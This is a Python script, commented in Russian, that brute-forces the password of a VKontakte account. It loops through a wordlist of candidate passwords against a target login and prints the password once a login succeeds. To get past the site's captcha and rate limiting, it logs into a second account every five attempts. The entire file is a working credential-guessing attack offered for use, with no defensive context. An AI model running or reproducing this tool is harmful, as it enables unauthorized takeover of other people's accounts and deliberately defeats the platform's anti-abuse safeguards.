import os
import sys
import requests

import vk_api
from PIL import Image


def captcha_handler(captcha):
    captcha_picture = requests.get(captcha.get_url())
    with open("captcha.jpg", "wb") as file:
        file.write(captcha_picture.content)
    img = Image.open("./captcha.jpg")
    img.show()
    # os.remove("./captcha.jpg")
    cpt = input("Введите капчу: ")

    return captcha.try_again(cpt.strip())

count = 0 # считаем введёные пароли
auth_count = 0 # считаем итерации
login_a = "" # логин к подбираемой странице

login_b = "" # логин к странице для сброса капчи
password_b = "" # пароль к странице для сброса капчи

password_file = "" # файл с паролями (пример, passwords.txt)

# читаем файл с паролями построчно
with open(password_file, "r") as file:
    password = file.read().splitlines()

while len(password) > count:
    # на каждые 5 раз авторизуемся, что бы избавиться от капчи
    if auth_count == 5:
        vk_session = vk_api.VkApi(login_b, password_b, captcha_handler = captcha_handler)
        vk_session.auth()
        os.remove("vk_config.v2.json")
        auth_count = 0
    try:
        vk_sessions = vk_api.VkApi(login_a, password[count], captcha_handler = captcha_handler) # делаем попытку авторизации
        vk_sessions.auth()
        print("[Password cracked!]:   " + password[count]) # если Успех, то выводим пароль
        sys.exit()
    except:
        print(password[count]) # если ошибка, то идем дальше считывая пароли
    
    auth_count += 1
    count += 1